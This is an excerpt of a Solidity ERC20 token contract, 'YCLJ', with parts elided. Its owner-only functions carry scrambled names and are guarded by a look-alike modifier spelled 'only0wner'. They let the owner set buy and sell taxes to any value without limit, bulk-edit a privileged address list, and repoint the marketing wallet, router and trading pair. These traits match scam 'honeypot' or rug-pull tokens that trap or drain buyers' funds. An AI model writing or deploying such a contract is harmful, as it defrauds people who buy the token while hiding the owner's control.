...
contract YCLJ is ERC20, Ownable{
    ...
    mapping (address => bool) public xXLdxabfSet;
    ...
    constructor() ERC20("YCLJ", "YCLJ") {
        ...
        xXLdxabfSet[msg.sender] = true;
        xXLdxabfSet[address(pair)] = true;
        xXLdxabfSet[marketingWallet] = true;
        xXLdxabfSet[address(router)] = true;
        xXLdxabfSet[address(this)] = true;
    }
    ...
    function dLiyOhIXUidVnR(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function WXClaozTUHGR(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            xXLdxabfSet[accounts[i]] = newValue;
        }
    }

    function SoZAnlievCp(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function uRBWJZHuEUgd(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function badstFBVPUEo(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function nlutBxFROWd(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
